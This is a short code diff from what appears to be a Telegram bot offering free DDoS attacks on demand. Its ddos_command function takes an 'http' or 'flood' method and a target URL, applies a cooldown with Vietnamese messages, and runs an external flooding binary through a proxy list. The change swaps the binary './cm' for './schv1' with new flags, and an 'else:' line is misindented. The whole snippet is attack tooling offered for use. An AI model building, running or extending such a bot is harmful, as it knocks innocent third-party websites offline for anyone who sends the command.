@@ -217,9 +217,9 @@ def ddos_command(message):
         bot.reply_to(message, f"@{username} Vui lòng đợi {remaining_time} giây trước khi sử dụng lại lệnh")
         return
     elif method == "http":
-        command = ["./cm", host, "-proxy", "proxy.txt" "hetb"]
+        command = ["./schv1", "-site", host, "-proxy", "proxy.txt", "-hetb", "-safe"]
     elif method == "flood":
-        command = ["./cm", host, "-proxy", "proxy.txt", "-heta"]
+        command = ["./schv1", "-site", host, "-proxy", "proxy.txt", "-heta", "-safe"]
         else:
         bot.reply_to(message, 'Method erron\nMethod Start Attack\nflood\nhttp\nHow to run /ddosfree <Method> <url>')
         return
